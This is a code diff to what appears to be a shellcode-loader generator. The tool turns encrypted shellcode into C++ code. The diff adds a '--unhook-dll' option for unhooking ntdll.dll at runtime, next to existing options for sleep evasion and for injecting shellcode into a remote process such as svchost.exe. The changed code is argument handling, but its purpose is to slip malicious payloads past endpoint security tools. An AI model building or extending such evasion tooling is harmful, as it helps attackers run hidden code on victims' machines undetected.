@@ -113,6 +113,7 @@ def main():
 
     parser.add_argument('--sleep-evasion', default=0, type=int, help="Sleeps for x seconds when the program is initially launched.")
     parser.add_argument('--remote-inject-executable', default="C:\\Windows\\System32\\svchost.exe", help="If injecting in a remote process, this indicates the process to inject the shellcode into.")
+    parser.add_argument('--unhook-dll', action='append', help="Unhooks the indicated DLLs at runtime (C:\\Windows\\System32\\ntdll.dll).")
 
     args = parser.parse_args()
 
@@ -162,6 +163,9 @@ def main():
 
     if args.remote_inject_executable:
         code_config["remote_inject_executable"] = args.remote_inject_executable
+
+    if args.unhook_dll and len(args.unhook_dll) > 0:
+        code_config["unhook_dll"] = args.unhook_dll
 
     # Generates the C++ code.
     generated_code = generate_code(hex_encrypted_shellcode, hex_key, code_config)
